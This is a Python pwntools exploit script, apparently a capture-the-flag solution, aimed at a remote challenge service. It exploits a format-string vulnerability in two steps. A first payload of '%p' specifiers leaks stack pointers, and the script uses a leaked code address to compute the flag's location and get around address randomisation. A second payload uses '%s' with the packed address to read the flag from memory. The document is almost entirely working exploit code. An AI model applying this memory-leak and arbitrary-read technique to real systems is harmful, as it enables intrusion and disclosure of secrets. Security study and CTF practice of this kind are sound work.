#!/usr/bin/env python3

from pwn import *

# r = process("./share/chal")
r = remote("10.113.184.121", 10055)

payload = b"%p " * 61 + b"\xaf\xbe\xad\xde" * 2
r.sendline(payload)  # Total 192 bytes

line = r.recvuntil(b"\xaf\xbe\xad\xde" * 2)
print("Observe:")
[print(f"Line {i}:\t{l}") for i, l in enumerate(line.split())]
print("len: ", len(line.split()))

addr = line.split()[44]
print("addr: ", addr)

addr_offset = 0x559bce5891e9
flag_offset = 0x559bce58c040

flag_addr = int(addr, 16) - addr_offset + flag_offset
print("flag_addr: ", hex(flag_addr))

# payload = b"%p " * 32 + p64(flag_addr) + b"\xaf\xbe\xad\xde"
payload = b"%p " * 19 + b"%s " + b"%p " * 12 + p64(flag_addr) + b"\xaf\xbe\xad\xde"
r.sendline(payload)  # Total 109 bytes

line = r.recvuntil(b"deadbeaf")
print("Observe:")
[print(f"Line {i}:\t{l}") for i, l in enumerate(line.split())]
print("len: ", len(line.split()))

flag = line.split()[19]
print("flag: ", flag)

# r.interactive()
